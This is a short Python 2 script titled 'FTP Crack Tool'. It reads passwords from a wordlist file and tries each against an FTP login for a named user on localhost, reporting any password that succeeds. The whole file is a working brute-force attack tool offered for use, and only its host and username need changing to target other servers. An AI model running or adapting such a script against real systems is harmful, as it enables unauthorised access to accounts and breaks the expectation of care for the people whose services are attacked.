#!/usr/bin/env python

import sys, os
import ftplib
from termcolor import colored
from colorama import Fore, Back, Style


def ftp_brute(p):
	try:
		print "Pass trying for FTP :  ", p
		host = 'localhost'
		user = "besim"
		ftp = ftplib.FTP(host, timeout=0.08)
		ftp.login(user, p)
		print colored("Password Found ! :) = > " + str(p), 'green')
		ftp.quit()
		sys.exit(0)
		
	except Exception, e:
		sys.stdout.flush()

if __name__ == "__main__":
	os.system('reset')
	print(Back.GREEN + '\t\t\tFTP Crack Tool\t\t\t\t\t\n')
	print(Style.RESET_ALL)
	passfile = open("pass.txt", "r").readlines()
	map(ftp_brute, passfile)
	print Back.WHITE + Fore.RED + "I can't found password for you :/ I m sorry :-("
	print Back.WHITE + Fore.RED + "Try ", len(passfile), " password for cracking :/"
